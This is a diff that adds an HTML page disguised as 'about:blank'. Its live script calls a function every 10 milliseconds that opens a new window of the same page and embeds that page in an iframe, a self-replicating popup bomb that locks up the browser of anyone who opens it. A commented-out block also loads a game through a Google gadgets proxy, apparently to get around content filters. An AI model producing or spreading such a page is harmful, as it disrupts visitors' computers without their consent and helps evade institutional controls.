@@ -1,0 +1,83 @@
+<html>
+    <head>
+        <title>about:blank</title>
+    </head>
+    <body onload="Main()">
+<div onload='window.open(window.location.href,"about:blank","popup")'></div>
+        <!--
+            
+        var urlObj = new window.URL(window.location.href);
+        var url = "https://images-opensocial.googleusercontent.com/gadgets/ifr?url=https://googleusercontent.b-cdn.net/basket-random/basran.xml";
+
+        if (url) {
+            var win;
+
+            document.querySelector('button').onclick = function() {
+                if (win) {
+                    win.focus();
+                } else {
+                    win = window.open();
+                    win.document.body.style.margin = '0';
+                    win.document.body.style.height = '100vh';
+                    var iframe = win.document.createElement('iframe');
+                    iframe.style.border = 'none';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100%';
+                    iframe.style.margin = '0';
+                    iframe.src = url;
+                    win.document.body.appendChild(iframe);
+                    
+
+                    var interval = setInterval(function() {
+                        if (win.closed) {
+                            clearInterval(interval);
+                            win = undefined;
+
+                        }
+                    }, 500);
+
+
+                }
+            };
+        }
+    
+        -->
+        <p id="location"></p>
+        <script>
+            const Locationv = document.getElementById("location")
+            function Main(){
+                function Win(){
+                    let WindowVar;
+                    var link = document.createElement("a");
+                    document.body.appendChild(link);
+                    link.src = window.location.href;
+                    link.click();
+                if (WindowVar){
+                    WindowVar.focus()
+                } else {
+                    WindowVar = window.open(window.location.href)
+                    WindowVar.document.body.style.margin = '0';
+                    WindowVar.document.body.style.height = '100vh';
+                    var iframe = WindowVar.document.createElement('iframe');
+                    iframe.style.border = 'none';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100%';
+                    iframe.style.margin = '0';
+                    iframe.src = window.location.href;
+                    WindowVar.document.body.appendChild(iframe);
+                    
+
+                    var interval = setInterval(function() {
+                        if (WindowVar.closed) {
+                            clearInterval(interval);
+                            WindowVar = undefined;
+
+                        }
+                    }, 500);
+                }
+                }
+                setInterval(Win,10)
+            }
+        </script>
+    </body>
+</html>
